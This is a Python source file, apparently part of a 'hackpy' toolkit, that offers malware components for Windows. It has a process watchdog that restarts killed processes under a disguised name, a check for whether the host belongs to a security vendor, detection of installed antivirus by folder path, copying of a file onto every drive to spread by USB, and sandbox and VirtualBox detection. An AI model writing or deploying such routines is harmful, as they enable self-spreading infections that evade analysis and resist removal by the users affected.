from hackpy.file        import *
from hackpy.modules     import *
from hackpy.commands    import *
from hackpy.taskmanager import *
from subprocess         import Popen
from threading          import Thread
from os                 import environ
from random             import choice

# Restart process automatically when it stopped by user
class watchdog:
	def __init__(self, process):
		self.process       = process
		self.watchdog_name = choice(taskmanager.list()).split('.')[0] + '_.exe'

	# Start watchdog
	def start(self):
		require_module('watchdog.exe')
		# Check if process active
		if not taskmanager.find(self.process):
			raise OSError('Process ' + self.process + ' not found!')
		# Copy watchdog
		file.copy(modules_path + 'watchdog.exe', temp_path + self.watchdog_name)
		# Start watchdog
		def startWatch():
			Popen(
				temp_path + self.watchdog_name + ' ' + self.process,
				shell     = True
			)
		# Start Thread
		Thread(target = startWatch).start()

	# Stop watchdog
	def stop(self):
		command.system('taskkill /f /im ' + self.watchdog_name)
		file.remove(temp_path + self.watchdog_name)


# Detect organization
def checkOrganization():
	from hackpy.network import whois
	try:
		organization = whois()['org'].lower()
	except:
		return False
	org_list = (
		'microsoft',
		'google',
		'amazon',
		'facebook',
		'avast',
		'avira',
		'avg',
		'vds',
		'cisco',
		'bitdefender',
		'comodo',
		'clamwin',
		'dr.web',
		'eset',
		'grizzly',
		'kaspersky',
		'malware',
		'norton',
		'antivirus',
		'security',
		'secure',
		'defender',
		'zonealarm',
		'immunet',
		'check point',
		'f-secure',
		'f-prot',
		'frisk',
		'fortinet',
		'g data',
		'mcaffe',
		'sophos',
		'panda',
		'qihoo',
		'quick heal',
		'trend micro',
		'trustport',
		'virusblokada',
		'webroot',
		'symantec',
	)
	for company in org_list:
		if (company in organization):
			return True
	return False

# Detect installed antivirus software
def detectProtection():
	SYS_DRIVE = environ['SystemDrive'] + '\\'
	detected  = {}
	av_path   = {
	 'AVAST 32bit': 'Program Files (x86)\\AVAST Software\\Avast',
	 'AVAST 64bit': 'Program Files\\AVAST Software\\Avast',
	 'AVG 32bit': 'Program Files (x86)\\AVG\\Antivirus',
	 'AVG 64bit': 'Program Files\\AVG\\Antivirus',
	 'Avira 32bit': 'Program Files (x86)\\Avira\\Launcher',
	 'Avira 64bit': 'Program Files\\Avira\\Launcher',
	 'Advanced SystemCare 32bit': 'Program Files (x86)\\IObit\\Advanced SystemCare',
	 'Advanced SystemCare 64bit': 'Program Files\\IObit\\Advanced SystemCare',
	 'Bitdefender 32bit': 'Program Files (x86)\\Bitdefender Antivirus Free',
	 'Bitdefender 64bit': 'Program Files\\Bitdefender Antivirus Free',
	 'Comodo 32bit': 'Program Files (x86)\\COMODO\\COMODO Internet Security',
	 'Comodo 64bit': 'Program Files\\COMODO\\COMODO Internet Security',
	 'Dr.Web 32bit': 'Program Files (x86)\\DrWeb',
	 'Dr.Web 64bit': 'Program Files\\DrWeb',
	 'Eset 32bit': 'Program Files (x86)\\ESET\\ESET Security',
	 'Eset 64bit': 'Program Files\\ESET\\ESET Security',
	 'Grizzly Pro 32bit': 'Program Files (x86)\\GRIZZLY Antivirus',
	 'Grizzly Pro 64bit': 'Program Files\\GRIZZLY Antivirus',
	 'Kaspersky 32bit': 'Program Files (x86)\\Kaspersky Lab',
	 'Kaspersky 64bit': 'Program Files\\Kaspersky Lab',
	 'Malvare fighter 32bit': 'Program Files (x86)\\IObit\\IObit Malware Fighter',
	 'Malvare fighter 64bit': 'Program Files\\IObit\\IObit Malware Fighter',
	 'Norton 32bit': 'Program Files (x86)\\Norton Security',
	 'Norton 64bit': 'Program Files\\Norton Security',
	 'Panda Security 32bit': 'Program Files\\Panda Security\\Panda Security Protection',
	 'Panda Security 64bit': 'Program Files (x86)\\Panda Security\\Panda Security Protection',
	 'Windows Defender': 'Program Files\\Windows Defender',
	 '360 Total Security 32bit': 'Program Files (x86)\\360\\Total Security',
	 '360 Total Security 64bit': 'Program Files\\360\\Total Security'
	}
	for antivirus, path in av_path.items():
		if file.exists(SYS_DRIVE + path):
			detected[antivirus] = (SYS_DRIVE + path)
	return detected

# Copy file to all drives
def usbSpread(cpfile):
	drive_success = []
	for drive in file.get_drives():
		path = drive + cpfile
		if not file.exists(path):
			try:
				file.copy(cpfile, path)
			except:
				continue
			else:
				drive_success.append(drive)
	return drive_success

# Check if file in SandBox
def inSandBox():
	require_module('system_status.exe')
	status = command.system(modules_path + 'system_status.exe inSandbox')
	return eval(status)


# Check if file in VirtualBox
def inVirtualBox():
	require_module('system_status.exe')
	status = command.system(modules_path + 'system_status.exe inVirtualBox')
	return eval(status)